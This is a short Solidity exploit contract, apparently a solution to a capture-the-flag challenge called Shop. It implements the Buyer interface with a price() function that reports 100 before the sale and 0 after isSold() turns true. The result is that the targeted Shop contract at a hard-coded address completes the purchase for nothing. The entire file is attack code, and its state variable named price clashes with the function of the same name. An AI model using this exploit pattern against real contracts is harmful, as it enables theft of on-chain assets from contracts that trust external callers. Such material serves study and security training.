pragma solidity 0.4.24;

import './Shop.sol';

contract Pwn is Buyer {
  uint public price = 100;
  Shop shop = Shop(0x412faaa1ced833f56fa09e01391576d474b4805d);

  function price() external view returns (uint) {
      return shop.isSold()==true?0:100;
  }

  function pwn() external{
      shop.buy();
  }
}